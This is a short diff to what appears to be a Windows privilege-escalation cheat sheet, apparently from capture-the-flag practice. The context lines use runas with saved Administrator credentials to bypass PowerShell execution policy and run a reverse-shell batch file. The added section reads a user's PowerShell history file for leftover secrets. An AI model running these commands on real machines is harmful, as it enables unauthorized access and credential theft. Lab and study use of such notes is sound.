@@ -56,6 +56,11 @@ runas /user:ACCESS\Administrator /savecred "powershell -ExecutionPolicy Bypass -
 runas /user:ACCESS\Administrator /savecred c:\users\security\revshell.bat
 ```
 
+## PS history file
+```
+type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
 ## Metasploit
 Assuming you have an existing meterpreter access to the target
 ```
